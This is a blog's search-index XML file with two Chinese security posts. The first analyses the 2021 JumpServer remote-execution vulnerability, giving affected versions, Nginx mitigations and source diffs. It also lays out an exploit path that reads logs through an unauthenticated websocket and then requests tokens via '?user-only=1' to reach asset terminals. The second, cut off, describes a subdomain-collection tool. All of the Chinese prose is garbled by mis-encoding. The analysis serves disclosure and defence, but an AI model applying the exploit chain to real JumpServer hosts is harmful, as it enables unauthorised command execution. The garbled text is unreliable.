<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>JumpServer20210115è¿œç¨‹æ‰§è¡Œæ¼æ´</title>
    <url>/posts/51202/</url>
    <content><![CDATA[<h1 id="JumpServer20210115è¿œç¨‹æ‰§è¡Œæ¼æ´"><a href="#JumpServer20210115è¿œç¨‹æ‰§è¡Œæ¼æ´" class="headerlink" title="JumpServer20210115è¿œç¨‹æ‰§è¡Œæ¼æ´"></a>JumpServer20210115è¿œç¨‹æ‰§è¡Œæ¼æ´</h1><p>æ¼æ´æ¦‚è¿°ï¼šç”±äºJumpServerçš„websocketæ¥å£æœªåšæˆæƒé™åˆ¶ï¼Œå…è®¸æ”»å‡»è€…é€šè¿‡ç²¾å¿ƒæ„é€ çš„è¯·æ±‚è·å–æ—¥å¿—æ–‡ä»¶ï¼Œä»æ—¥å¿—æ–‡ä»¶ä¸­å¯è·å–æ•æ„Ÿä¿¡æ¯ç”Ÿæˆtokenï¼Œå†åˆ©ç”¨ç”Ÿæˆçš„tokené€šè¿‡ç›¸å…³æ“ä½œAPIåœ¨èµ„äº§ä¸»æœºä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚</p>
<a id="more"></a>
<p>JumpServerçš„githubé¦–é¡µèƒ½çœ‹åˆ°å®˜æ–¹çš„<a href="https://github.com/jumpserver/jumpserver">ç´§æ€¥BUGä¿®å¤é€šçŸ¥</a></p>
<p><strong>å½±å“ç‰ˆæœ¬:</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt; v2.6.2</span><br><span class="line">&lt; v2.5.4</span><br><span class="line">&lt; v2.4.5 </span><br><span class="line">&#x3D; v1.5.9</span><br><span class="line">&gt;&#x3D; v1.5.3</span><br></pre></td></tr></table></figure>
<p><strong>å®‰å…¨ç‰ˆæœ¬:</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt;&#x3D; v2.6.2</span><br><span class="line">&gt;&#x3D; v2.5.4</span><br><span class="line">&gt;&#x3D; v2.4.5 </span><br><span class="line">&#x3D; v1.5.9 ï¼ˆç‰ˆæœ¬å·æ²¡å˜ï¼‰</span><br><span class="line">&lt; v1.5.3</span><br></pre></td></tr></table></figure>

<p><strong>ä¿®å¤æ–¹æ¡ˆ:</strong></p>
<p>å°†JumpServerå‡çº§è‡³å®‰å…¨ç‰ˆæœ¬ï¼›</p>
<p><strong>ä¸´æ—¶ä¿®å¤æ–¹æ¡ˆ:</strong></p>
<p>ä¿®æ”¹ Nginx é…ç½®æ–‡ä»¶å±è”½æ¼æ´æ¥å£ </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;api&#x2F;v1&#x2F;authentication&#x2F;connection-token&#x2F;</span><br><span class="line">&#x2F;api&#x2F;v1&#x2F;users&#x2F;connection-token&#x2F;</span><br></pre></td></tr></table></figure>

<p>Nginx é…ç½®æ–‡ä»¶ä½ç½®</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># ç¤¾åŒºè€ç‰ˆæœ¬</span><br><span class="line">&#x2F;etc&#x2F;nginx&#x2F;conf.d&#x2F;jumpserver.conf</span><br><span class="line"></span><br><span class="line"># ä¼ä¸šè€ç‰ˆæœ¬</span><br><span class="line">jumpserver-release&#x2F;nginx&#x2F;http_server.conf</span><br><span class="line"> </span><br><span class="line"># æ–°ç‰ˆæœ¬åœ¨ </span><br><span class="line">jumpserver-release&#x2F;compose&#x2F;config_static&#x2F;http_server.conf</span><br></pre></td></tr></table></figure>

<p>ä¿®æ”¹ Nginx é…ç½®æ–‡ä»¶å®ä¾‹</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">### ä¿è¯åœ¨ &#x2F;api ä¹‹å‰ å’Œ &#x2F; ä¹‹å‰</span><br><span class="line">location c &#123;</span><br><span class="line">   return 403;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">location &#x2F;api&#x2F;v1&#x2F;users&#x2F;connection-token&#x2F; &#123;</span><br><span class="line">   return 403;</span><br><span class="line">&#125;</span><br><span class="line">### æ–°å¢ä»¥ä¸Šè¿™äº›</span><br><span class="line"> </span><br><span class="line">location &#x2F;api&#x2F; &#123;</span><br><span class="line">    proxy_set_header X-Real-IP $remote_addr;</span><br><span class="line">    proxy_set_header Host $host;</span><br><span class="line">    proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;</span><br><span class="line">    proxy_pass http:&#x2F;&#x2F;core:8080;</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>ä¿®æ”¹å®Œæˆåé‡å¯ nginx</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dockeræ–¹å¼: </span><br><span class="line">docker restart jms_nginx</span><br><span class="line"></span><br><span class="line">nginxæ–¹å¼:</span><br><span class="line">systemctl restart nginx</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>ä¿®å¤éªŒè¯</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ wget https:&#x2F;&#x2F;github.com&#x2F;jumpserver&#x2F;jumpserver&#x2F;releases&#x2F;download&#x2F;v2.6.2&#x2F;jms_bug_check.sh </span><br><span class="line"></span><br><span class="line"># ä½¿ç”¨æ–¹æ³• bash jms_bug_check.sh HOST </span><br><span class="line">$ bash jms_bug_check.sh demo.jumpserver.org</span><br><span class="line">æ¼æ´å·²ä¿®å¤</span><br></pre></td></tr></table></figure>

<p><strong>å…¥ä¾µæ£€æµ‹</strong></p>
<p>ä¸‹è½½è„šæœ¬åˆ° jumpserver æ—¥å¿—ç›®å½•ï¼Œè¿™ä¸ªç›®å½•ä¸­å­˜åœ¨ gunicorn.logï¼Œç„¶åæ‰§è¡Œ</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ pwd</span><br><span class="line">&#x2F;opt&#x2F;jumpserver&#x2F;core&#x2F;logs</span><br><span class="line"></span><br><span class="line">$ ls gunicorn.log </span><br><span class="line">gunicorn.log</span><br><span class="line"></span><br><span class="line">$ wget &#39;https:&#x2F;&#x2F;github.com&#x2F;jumpserver&#x2F;jumpserver&#x2F;releases&#x2F;download&#x2F;v2.6.2&#x2F;jms_check_attack.sh&#39;</span><br><span class="line">$ bash jms_check_attack.sh</span><br><span class="line">ç³»ç»Ÿæœªè¢«å…¥ä¾µ</span><br></pre></td></tr></table></figure>

<h2 id="WSæœªæˆæƒè®¿é—®æ—¥å¿—"><a href="#WSæœªæˆæƒè®¿é—®æ—¥å¿—" class="headerlink" title="WSæœªæˆæƒè®¿é—®æ—¥å¿—"></a>WSæœªæˆæƒè®¿é—®æ—¥å¿—</h2><h3 id="æºç åˆ†æ"><a href="#æºç åˆ†æ" class="headerlink" title="æºç åˆ†æ"></a>æºç åˆ†æ</h3><p>urlï¼š<a href="https://githistory.xyz/jumpserver/jumpserver/blob/db6f7f66b2e5e557081cb561029f64af0a1f80c4/apps/ops/ws.py">https://githistory.xyz/jumpserver/jumpserver/blob/db6f7f66b2e5e557081cb561029f64af0a1f80c4/apps/ops/ws.py</a><br>å®˜æ–¹ä¿®å¤æ—¶æ”¹åŠ¨çš„ä»£ç æ®µï¼š</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">connect</span>(<span class="params">self</span>):</span></span><br><span class="line">    user = self.scope[<span class="string">&quot;user&quot;</span>]</span><br><span class="line">    <span class="keyword">if</span> user.is_authenticated <span class="keyword">and</span> user.is_org_admin:</span><br><span class="line">        self.accept()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        self.close()</span><br></pre></td></tr></table></figure>
<p>ä¿®å¤å‰ï¼š</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">connect</span>(<span class="params">self</span>):</span></span><br><span class="line">    self.accept()</span><br></pre></td></tr></table></figure>

<p>è¯¥ç±»çš„è·¯ç”±å¯ä»æºç å¾—çŸ¥ï¼š</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">path(<span class="string">&#x27;ws/ops/tasks/log/&#x27;</span>, ws.CeleryLogWebsocket, name=<span class="string">&#x27;task-log-ws&#x27;</span>),</span><br></pre></td></tr></table></figure>

<h3 id="åˆ©ç”¨"><a href="#åˆ©ç”¨" class="headerlink" title="åˆ©ç”¨"></a>åˆ©ç”¨</h3><p>ç›®å‰çœ‹æ¥åˆ©ç”¨æ–¹å¼é™äºè¯»logã€‚<br><img src="/images/jumpserver_tasklist.png" alt="task_list"><br><img src="/images/jumpserver_taskid.png" alt="task_id"><br>WSæ’ä»¶ï¼š<a href="https://chrome.google.com/webstore/detail/websocket-test-client/fgponpodhbmadfljofbimhhlengambbn/related">å®‰è£…åœ°å€</a><br>å›¾æºï¼š<a href="https://www.o2oxy.cn/2921.html">JumpServerè¿œç¨‹æ‰§è¡Œæ¼æ´ ã€åªä¼šè¯»å–æ—¥å¿—ã€‘</a></p>
<p>â€“update20210119<br>åˆ©ç”¨æ–¹å¼ï¼šjumpserverçš„æ—¥å¿—ç›®å½•åœ¨<code>/opt/jumpserver/logs/</code>ï¼Œé€šè¿‡æŸ¥çœ‹gunicorn.logæ—¥å¿—ï¼Œå¯ä»¥è·å–åˆ°user_idã€asset_idã€system_user_idã€‚</p>
<h2 id="Tokenè·å–"><a href="#Tokenè·å–" class="headerlink" title="Tokenè·å–"></a>Tokenè·å–</h2><h3 id="æºç åˆ†æ-1"><a href="#æºç åˆ†æ-1" class="headerlink" title="æºç åˆ†æ"></a>æºç åˆ†æ</h3><p>urlï¼š<a href="https://githistory.xyz/jumpserver/jumpserver/blob/db6f7f66b2e5e557081cb561029f64af0a1f80c4/apps/authentication/api/auth.py">https://githistory.xyz/jumpserver/jumpserver/blob/db6f7f66b2e5e557081cb561029f64af0a1f80c4/apps/authentication/api/auth.py</a><br>å®˜æ–¹ä¿®å¤æ—¶è¢«åˆ é™¤çš„ä»£ç æ®µï¼š</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_permissions</span>(<span class="params">self</span>):</span></span><br><span class="line">    <span class="keyword">if</span> self.request.query_params.get(<span class="string">&#x27;user-only&#x27;</span>, <span class="literal">None</span>):</span><br><span class="line">        self.permission_classes = (AllowAny,)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">super</span>().get_permissions()    <span class="comment"># è°ƒç”¨APIViewçš„get_permissions()</span></span><br></pre></td></tr></table></figure>
<p>å¯ä»¥ç†è§£ä¸ºå¦‚æœget/postè¯·æ±‚å¸¦æœ‰<code>user-only</code>å‚æ•°ï¼Œåˆ™è¯¥æ¥å£ä»»æ„ç”¨æˆ·å¯è®¿é—®ã€‚</p>
<h3 id="åˆ©ç”¨-1"><a href="#åˆ©ç”¨-1" class="headerlink" title="åˆ©ç”¨"></a>åˆ©ç”¨</h3><p>æ¼æ´æ¥å£ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">xxx.xxx.xxx.xxx&#x2F;api&#x2F;v1&#x2F;users&#x2F;connection-token&#x2F;?user-only&#x3D;1</span><br><span class="line">xxx.xxx.xxx.xxx&#x2F;api&#x2F;v1&#x2F;authentication&#x2F;connection-token&#x2F;?user-only&#x3D;1</span><br></pre></td></tr></table></figure>
<p>è¿™ä¸¤ä¸ªæ¥å£éƒ½å¯ä»¥ä½¿ç”¨ï¼Œå› ä¸ºæœ€ç»ˆéƒ½æ˜¯è°ƒç”¨æ¼æ´ç‚¹UserConnectionTokenApiã€‚<br>åˆ©ç”¨æ–¹å¼ï¼š<br>é€šè¿‡æ—¥å¿—ä¸­è·å–user_idã€asset_idã€system_user_idï¼Œå†æ„é€ postè¯·æ±‚è·å–tokenã€‚<br>jumpserverç›¸å…³æºç ï¼š<br><img src="/images/jumpserver_UserConnectionTokenApi.png" alt="UserConnectionTokenApi"></p>
<h2 id="ä»£ç æ‰§è¡Œ"><a href="#ä»£ç æ‰§è¡Œ" class="headerlink" title="ä»£ç æ‰§è¡Œ"></a>ä»£ç æ‰§è¡Œ</h2><p>connection-tokenæ¥å£ç”Ÿæˆçš„tokenä½œä¸ºrest_apiå‡­è¯ä½¿ç”¨ä¼šæŠ¥é”™ï¼Œéœ€è¦åˆ©ç”¨kokoå®Œæˆä»£ç æ‰§è¡Œã€‚<br>kokoå¯¹connection-tokençš„ä½¿ç”¨æ–¹å¼ï¼š<br><code>https://github.com/jumpserver/koko/blob/master/pkg/service/urls.go#L13</code><br><a href="https://blog.fit2cloud.com/?p=870">å…³äºkoko</a>ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">2019å¹´9æœˆ30æ—¥ï¼ŒJumpserverå ¡å’æœºå‘å¸ƒV1.5.3ç‰ˆæœ¬ã€‚è‡ªV1.5.3ç‰ˆæœ¬èµ·ï¼ŒKokoï¼ˆå³åŸºäºGoè¯­è¨€å¼€å‘çš„SSHå®¢æˆ·ç«¯ï¼‰å°†æ‹…ä»»Cocoï¼ˆå³åŸºäºPythonè¯­è¨€å¼€å‘çš„SSHå®¢æˆ·ç«¯ï¼‰åœ¨Jumpserveré¡¹ç›®ä¸­çš„è§’è‰²ï¼Œåç»­ç‰ˆæœ¬å°†ä¸ä¼šå†å¯¹Cocoè¿›è¡Œç»´æŠ¤ã€‚</span><br><span class="line">Kokoæ˜¯ä½¿ç”¨Goé‡æ„çš„Unixèµ„äº§è¿æ¥ç»„ä»¶ã€‚</span><br></pre></td></tr></table></figure>

<h3 id="kokoåˆ©ç”¨é“¾åˆ†æ"><a href="#kokoåˆ©ç”¨é“¾åˆ†æ" class="headerlink" title="kokoåˆ©ç”¨é“¾åˆ†æ"></a>kokoåˆ©ç”¨é“¾åˆ†æ</h3><ol>
<li>urls.go<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">TokenAssetURL      = <span class="string">&quot;/api/v1/authentication/connection-token/?token=%s&quot;</span> <span class="comment">// Token name</span></span><br></pre></td></tr></table></figure></li>
<li>assets.go<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">GetTokenAsset</span><span class="params">(token <span class="keyword">string</span>)</span> <span class="params">(tokenUser model.TokenUser)</span></span> &#123;</span><br><span class="line">	Url := fmt.Sprintf(TokenAssetURL, token)</span><br><span class="line">	_, err := authClient.Get(Url, &amp;tokenUser)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		logger.Error(<span class="string">&quot;Get Token Asset info failed: &quot;</span>, err)</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li>webserber.go<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(s *server)</span> <span class="title">processTokenWebsocket</span><span class="params">(ctx *gin.Context)</span></span> &#123;</span><br><span class="line">    <span class="comment">// http://*****/koko/ws/token/?target_id=xxxxxxxxxx</span></span><br><span class="line">	tokenId, _ := ctx.GetQuery(<span class="string">&quot;target_id&quot;</span>)</span><br><span class="line">	tokenUser := service.GetTokenAsset(tokenId)</span><br><span class="line">	<span class="keyword">if</span> tokenUser.UserID == <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">		logger.Errorf(<span class="string">&quot;Token is invalid: %s&quot;</span>, tokenId)</span><br><span class="line">		ctx.AbortWithStatus(http.StatusBadRequest)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	currentUser := service.GetUserDetail(tokenUser.UserID)</span><br><span class="line">	<span class="keyword">if</span> currentUser == <span class="literal">nil</span> &#123;</span><br><span class="line">		logger.Errorf(<span class="string">&quot;Token userID is invalid: %s&quot;</span>, tokenUser.UserID)</span><br><span class="line">		ctx.AbortWithStatus(http.StatusBadRequest)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	targetType := TargetTypeAsset</span><br><span class="line">	targetId := strings.ToLower(tokenUser.AssetID)</span><br><span class="line">    systemUserId := tokenUser.SystemUserID</span><br><span class="line">    <span class="comment">// æ ¹æ®tokenä¼ é€’çš„ä¿¡æ¯å¼€å¯ç»ˆç«¯</span></span><br><span class="line">	s.runTTY(ctx, currentUser, targetType, targetId, systemUserId)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li>webserber.go<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(s *server)</span> <span class="title">websocketHandlers</span><span class="params">(router *gin.RouterGroup)</span></span> &#123;</span><br><span class="line">	wsGroup := router.Group(<span class="string">&quot;/ws/&quot;</span>)</span><br><span class="line"></span><br><span class="line">	wsGroup.Group(<span class="string">&quot;/terminal&quot;</span>).Use(</span><br><span class="line">		s.middleSessionAuth()).GET(<span class="string">&quot;/&quot;</span>, s.processTerminalWebsocket)</span><br><span class="line"></span><br><span class="line">	wsGroup.Group(<span class="string">&quot;/elfinder&quot;</span>).Use(</span><br><span class="line">		s.middleSessionAuth()).GET(<span class="string">&quot;/&quot;</span>, s.processElfinderWebsocket)</span><br><span class="line"></span><br><span class="line">	wsGroup.Group(<span class="string">&quot;/token&quot;</span>).GET(<span class="string">&quot;/&quot;</span>, s.processTokenWebsocket)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

</li>
</ol>
<h2 id="Update"><a href="#Update" class="headerlink" title="Update"></a>Update</h2><p>20210119-æ ¹æ®<a href="https://blog.riskivy.com/jumpserver-%e4%bb%8e%e4%bf%a1%e6%81%af%e6%b3%84%e9%9c%b2%e5%88%b0%e8%bf%9c%e7%a8%8b%e4%bb%a3%e7%a0%81%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9e%e5%88%86%e6%9e%90/">JumpServer ä»ä¿¡æ¯æ³„éœ²åˆ°è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´åˆ†æ</a>å¯¹æ–‡ç« è¿›è¡Œbugä¿®å¤ã€‚</p>
]]></content>
      <categories>
        <category>websec</category>
      </categories>
      <tags>
        <tag>redteam</tag>
      </tags>
  </entry>
  <entry>
    <title>subdomainCol - å­åŸŸåæ”¶é›†æ¥å£å·¥å…·</title>
    <url>/posts/59884/</url>
    <content><![CDATA[<h1 id="subdomainCol-å­åŸŸåæ”¶é›†æ¥å£å·¥å…·"><a href="#subdomainCol-å­åŸŸåæ”¶é›†æ¥å£å·¥å…·" class="headerlink" title="subdomainCol - å­åŸŸåæ”¶é›†æ¥å£å·¥å…·"></a>subdomainCol - å­åŸŸåæ”¶é›†æ¥å£å·¥å…·</h1><h2 id="å‰æƒ…æè¦"><a href="#å‰æƒ…æè¦" class="headerlink" title="å‰æƒ…æè¦"></a>å‰æƒ…æè¦</h2><ol>
<li>è‡ªå·±æƒ³è¦ä¸ªçº¯ç²¹çš„å­åŸŸåæ”¶é›†æ¥å£å°å·¥å…·ï¼ŒJust Wrapperã€‚</li>
<li>ç›®å‰æ²¡å‘ç°å•ç‹¬çš„æ³›è§£æå¤„ç†å·¥å…·ï¼Œæˆ–è®¸ä¼šæœ‰äººéœ€è¦ã€‚</li>
<li>ä¹‹å‰æ²¡æœ‰åšè¿‡æ¯”è¾ƒå®Œæ•´çš„pythoné¡¹ç›®ï¼Œç»ƒæ‰‹For Funã€‚</li>
<li>ä»£ç è´¨é‡åƒåœ¾è­¦å‘Š</li>
</ol>
<h2 id="TL-DR"><a href="#TL-DR" class="headerlink" title="TL;DR"></a>TL;DR</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">               __        __                      _       ______      __</span><br><span class="line">   _______  __&#x2F; &#x2F;_  ____&#x2F; &#x2F;___  ____ ___  ____ _(_)___  &#x2F; ____&#x2F;___  &#x2F; &#x2F;</span><br><span class="line">  &#x2F; ___&#x2F; &#x2F; &#x2F; &#x2F; __ \&#x2F; __  &#x2F; __ \&#x2F; __ &#96;__ \&#x2F; __ &#96;&#x2F; &#x2F; __ \&#x2F; &#x2F;   &#x2F; __ \&#x2F; &#x2F;</span><br><span class="line"> (__  ) &#x2F;_&#x2F; &#x2F; &#x2F;_&#x2F; &#x2F; &#x2F;_&#x2F; &#x2F; &#x2F;_&#x2F; &#x2F; &#x2F; &#x2F; &#x2F; &#x2F; &#x2F; &#x2F;_&#x2F; &#x2F; &#x2F; &#x2F; &#x2F; &#x2F; &#x2F;___&#x2F; &#x2F;_&#x2F; &#x2F; &#x2F;</span><br><span class="line">&#x2F;____&#x2F;\__,_&#x2F;_.___&#x2F;\__,_&#x2F;\____&#x2F;_&#x2F; &#x2F;_&#x2F; &#x2F;_&#x2F;\__,_&#x2F;_&#x2F;_&#x2F; &#x2F;_&#x2F;\____&#x2F;\____&#x2F;_&#x2F;</span><br><span class="line"></span><br><span class="line">Example:</span><br><span class="line">    python3 .&#x2F;subdomainCol&#x2F;subdomaincol.py --target xxx.com run</span><br><span class="line">    python3 .&#x2F;subdomainCol&#x2F;subdomaincol.py --targets .&#x2F;domains.txt run</span><br><span class="line">    python3 .&#x2F;subdomainCol&#x2F;subdomaincol.py --mode filter --targets .&#x2F;subfinder_xxxx.txt run</span><br><span class="line">    python3 .&#x2F;subdomainCol&#x2F;subdomaincol.py --targets .&#x2F;domains.txt --dic_path .&#x2F;dic.txt --timeout 7200 run</span><br><span class="line"></span><br><span class="line">:param str  target:     One domain</span><br><span class="line">:param str  targets:    File path of one domain per line</span><br><span class="line">:param str  mode:       Select the collection subdomain mode or filter mode,</span><br><span class="line">                        the default is collection mode (default&#x2F;filter)</span><br><span class="line">:param str  dic_path:   The dictionary path used by ksubdomain</span><br><span class="line">:param int  timeout:    Timeout time for each subprocess (seconds)</span><br></pre></td></tr></table></figure>

<p><strong>åŠŸèƒ½</strong>ï¼š</p>
<ol>
<li>è°ƒç”¨subfinderå’Œksubdomianè¿›è¡Œå­åŸŸåæ”¶é›†å¹¶è¿›è¡Œæ³›è§£æè¿‡æ»¤ã€‚</li>
<li>ç‹¬ç«‹çš„æ³›è§£æè¿‡æ»¤æ¥å£ï¼Œå³å¯ç›´æ¥å¯¹å­åŸŸåé›†åˆè¿›è¡Œæ³›è§£æè¿‡æ»¤ã€‚<a id="more"></a></li>
</ol>
<p><strong>ä½¿ç”¨æ–¹å¼</strong>ï¼š</p>
<ol>
<li>å¯¹å•ä¸ªåŸŸå<code>meituan.com</code>è¿›è¡Œå­åŸŸåæ”¶é›†<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ python3 .&#x2F;subdomainCol&#x2F;subdomaincol.py --target &quot;meituan.com&quot; run</span><br></pre></td></tr></table></figure></li>
<li>å¯¹<code>~/Downloads/meituan.txt</code>æ–‡ä»¶å†…çš„åŸŸåè¿›è¡Œå­åŸŸåæ”¶é›†<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ cat ~&#x2F;Downloads&#x2F;meituan.txt</span><br><span class="line">meituan.com</span><br><span class="line">meituan.net</span><br><span class="line">dianping.com</span><br><span class="line">neixin.cn</span><br><span class="line"></span><br><span class="line">$ python3 .&#x2F;subdomainCol&#x2F;subdomaincol.py --targets ~&#x2F;Downloads&#x2F;meituan.txt run</span><br></pre></td></tr></table></figure></li>
<li>å¯¹å­åŸŸåé›†åˆ<code>~/Downloads/subfinder_xxxx.txt</code>è¿›è¡Œæ³›è§£æè¿‡æ»¤<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ python3 .&#x2F;subdomainCol&#x2F;subdomaincol.py --mode filter --targets ~&#x2F;Downloads&#x2F;subfinder_xxxx.txt run</span><br></pre></td></tr></table></figure>

</li>
</ol>
<p><strong>é…ç½®æ–‡ä»¶</strong>ï¼š</p>
<ol>
<li>SubdomainColé…ç½®æ–‡ä»¶ä½ç½®å›ºå®šäº<code>SubdomainCol/config/config.yaml</code>ï¼Œæ ¹æ®éœ€æ±‚è¿›è¡Œä¿®æ”¹ã€‚</li>
<li>è¢«è°ƒç”¨çš„subfinderé…ç½®æ–‡ä»¶å›ºå®šäº<code>SubdomainCol/bin/subfinder/config.yaml</code>ï¼Œæ ¹æ®éœ€æ±‚è¿›è¡Œä¿®æ”¹ã€‚</li>
</ol>
<h2 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h2><ol>
<li>å¦‚ä½•å®‰è£…è½®å­A<br>çº¯ç²¹çš„è°ƒç”¨äº†åˆ«çš„å­åŸŸåå·¥å…·ï¼šsubfinderã€ksubdomianã€‚<br>åé¢å¯èƒ½è¿˜ä¼šè£…åˆ«å®¶çš„è½®å­ã€‚</li>
<li>å¦‚ä½•ç»„è£…è½®å­B<br>æ‰¾å¯»åå‘ç°oneforallçš„æ³›è§£ææ˜¯å®ç°çš„æ¯”è¾ƒå®Œå–„çš„ï¼Œä½†æ˜¯ä¼°è®¡å› ä¸ºä¸€äº›è€ƒè™‘æ²¡æœ‰åšç‹¬ç«‹æ¥å£ã€‚<br>äºæ˜¯æŠŠoneforallçš„æ³›è§£æå®ç°ç»™å•ç‹¬æŠ½æˆäº†ä¸ªæ³›è§£æè¿‡æ»¤æ¨¡å—ã€‚</li>
</ol>
<h2 id="æ³›è§£æ"><a href="#æ³›è§£æ" class="headerlink" title="æ³›è§£æ"></a>æ³›è§£æ</h2><h3 id="subfinder"><a href="#subfinder" class="headerlink" title="subfinder"></a>subfinder</h3><p>çœ‹readmeçš„æ—¶å€™å‘ç°æœ‰æ³›è§£æå¤„ç†å‚æ•°<code>-nW</code>ï¼Œä»£ç ä¸­å®ç°ä½äº<code>InitWildcards</code>å‡½æ•°ï¼ŒåŸç†æ¯”è¾ƒç®€å•ç²—æš´ï¼šéšæœºç”Ÿæˆä¸€ä¸ªå­—ç¬¦ä¸²æ‹¼æ¥åœ¨åŸŸåå‰é¢ï¼Œå¦‚æœ<code>nslookup</code>ä¸å­˜åœ¨è§£æåˆ°çš„ipå³ä¸å­˜åœ¨æ³›è§£æã€‚</p>
<h3 id="ksubdomain"><a href="#ksubdomain" class="headerlink" title="ksubdomain"></a>ksubdomain</h3><p>åŸç†æ˜¯æŠŠç»“æœé›†ä¸­çš„ipæ•°é‡è¿›è¡Œç»Ÿè®¡ï¼Œå³æŸä¸ªipåœ¨ç»“æœä¸­å‡ºç°äº†å¤šå°‘æ¬¡ã€‚å†æ ¹æ®æ­¤æ•°æ®è¿›è¡Œä¸€ä¸ªæƒé‡è®¡ç®—ï¼Œç±»ä¼¼ä¸€ç§æ¯”ä¾‹åˆ’åˆ†æŠŠï¼Œç”±æ­¤è¿‡æ»¤æ‰ä¸€äº›å¯èƒ½æœ‰æ³›è§£æå«Œç–‘çš„ipï¼Œä¸”ç”±æ­¤è¿‡æ»¤åŸŸåç»“æœé›†ã€‚</p>
<h3 id="oneforall"><a href="#oneforall" class="headerlink" title="oneforall"></a>oneforall</h3><ol>
<li><code>oneforall.py</code><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ä»¥ä¸€å®šçš„æ ¼å¼è·å–ä»target/targetså‚æ•°ä¼ å…¥çš„åŸŸå</span></span><br><span class="line">self.domains = utils.get_domains(self.target, self.targets)</span><br><span class="line">...</span><br><span class="line"><span class="comment"># å¤„ç†åŸŸååè½¬åˆ°mainå‡½æ•°</span></span><br><span class="line"><span class="keyword">for</span> domain <span class="keyword">in</span> self.domains:</span><br><span class="line">    self.domain = utils.get_main_domain(domain)</span><br><span class="line">    self.main()</span><br><span class="line">...</span><br><span class="line"><span class="comment"># åˆ¤æ–­ä¸»åŸŸåæ˜¯å¦å­˜åœ¨æ³›è§£æ</span></span><br><span class="line">self.enable_wildcard = wildcard.detect_wildcard(self.domain)</span><br><span class="line">...</span><br><span class="line"><span class="comment"># å¤„ç†æ³›è§£æ</span></span><br><span class="line"><span class="keyword">if</span> self.enable_wildcard:</span><br><span class="line">    <span class="comment"># deal wildcard</span></span><br><span class="line">    self.data = wildcard.deal_wildcard(self.data)</span><br></pre></td></tr></table></figure></li>
<li><code>wildcard.py</code><br>è¯¥æ¨¡å—æœ‰3ä¸ªä¸»è¦é€»è¾‘å¤„ç†å…¥å£ï¼šdetect_wildcard/collect_wildcard_record/deal_wildcard<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># é€šè¿‡éšæœºè¯·æ±‚ä¸»åŸŸåçš„3ä¸ªå­åŸŸåå¹¶è¿›è¡Œç›¸ä¼¼åº¦åˆ¤æ–­ï¼Œä»¥åˆ¤å®šè¯¥ä¸»åŸŸåæ˜¯å¦å­˜åœ¨æ³›è§£æç°è±¡</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">detect_wildcard</span>(<span class="params">domain</span>):</span></span><br><span class="line">    is_enable = to_detect_wildcard(domain)</span><br><span class="line">    <span class="keyword">if</span> is_enable:</span><br><span class="line">        logger.log(<span class="string">&#x27;ALERT&#x27;</span>, <span class="string">f&#x27;The domain <span class="subst">&#123;domain&#125;</span> enables wildcard&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        logger.log(<span class="string">&#x27;ALERT&#x27;</span>, <span class="string">f&#x27;The domain <span class="subst">&#123;domain&#125;</span> disables wildcard&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> is_enable</span><br><span class="line">...</span><br><span class="line"><span class="comment"># collect_wildcard_recordç”¨äºè·å–wildcard_ips, wildcard_ttlï¼›è¿™ä¸¤ä¸ªå‚æ•°æœ€ç»ˆä¼šä½œä¸ºwildcard.is_valid_subdomain(ip, ip_num, cname, cname_num, ttl, wc_ttl, wc_ips)çš„wc_ttl, 